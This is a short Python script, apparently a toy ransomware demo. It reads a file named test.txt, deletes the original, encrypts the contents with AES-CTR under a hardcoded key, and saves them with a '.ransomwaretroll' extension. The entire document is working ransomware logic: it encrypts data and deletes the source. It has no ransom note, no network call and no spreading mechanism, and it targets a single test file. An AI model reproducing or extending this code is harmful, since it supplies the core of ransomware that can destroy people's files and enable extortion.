import os
import pyaes


#open file crypt

file_name = 'test.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

#remove original file

os.remove(file_name)

#define key crypt

key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

#crypt file

crypto_data = aes.encrypt(file_data)

#salve crypt file

new_file = file_name + '.ransomwaretroll'
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()



